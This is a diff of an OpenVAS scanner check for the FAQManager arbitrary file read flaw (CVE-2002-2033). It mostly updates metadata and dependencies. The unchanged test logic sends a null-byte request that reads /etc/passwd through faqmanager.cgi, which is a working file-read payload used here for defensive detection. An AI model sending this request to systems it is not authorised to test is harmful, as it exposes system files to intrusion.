@@ -1,5 +1,5 @@
 # OpenVAS Vulnerability Test
-# $Id: faqmanager.nasl 6040 2017-04-27 09:02:38Z teissa $
+# $Id: faqmanager.nasl 6702 2017-07-12 13:49:41Z cfischer $
 # Description: FAQManager Arbitrary File Reading Vulnerability
 #
 # Authors:
@@ -34,8 +34,8 @@ www.fourteenminutes.com/code/faqmanager/";
 if(description)
 {
  script_id(10837);
- script_version("$Revision: 6040 $");
- script_tag(name:"last_modification", value:"$Date: 2017-04-27 11:02:38 +0200 (Thu, 27 Apr 2017) $");
+ script_version("$Revision: 6702 $");
+ script_tag(name:"last_modification", value:"$Date: 2017-07-12 15:49:41 +0200 (Wed, 12 Jul 2017) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_cve_id("CVE-2002-2033");
  script_bugtraq_id(3810);
@@ -46,33 +46,27 @@ if(description)
  
  summary = "Tests for FAQManager Arbitrary File Reading Vulnerability";
  
- 
  script_category(ACT_ATTACK);
   script_tag(name:"qod_type", value:"remote_vul");
  
  script_copyright("This script is Copyright (C) 2002 Matt Moore");
  family = "Web application abuses";
  script_family(family);
- script_dependencies("find_service.nasl", "no404.nasl");
+ script_dependencies("find_service.nasl", "no404.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
+ script_exclude_keys("Settings/disable_cgi_scanning");
+
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  exit(0);
 }
-
-# Check starts here
 
 include("http_func.inc");
 include("http_keepalive.inc");
 port = get_http_port(default:80);
 
 no404 = get_kb_item(string("www/no404/", port));
-if (no404)
-  exit(0);
-
-
-if(get_port_state(port))
-{ 
+if (no404) exit(0);
 
   req = http_get(item:"/cgi-bin/faqmanager.cgi?toc=/etc/passwd%00", port:port);
   r = http_keepalive_send_recv(port:port, data:req);
@@ -81,4 +75,3 @@ if(get_port_state(port))
    security_message(port);
    exit(0);
   }
-}
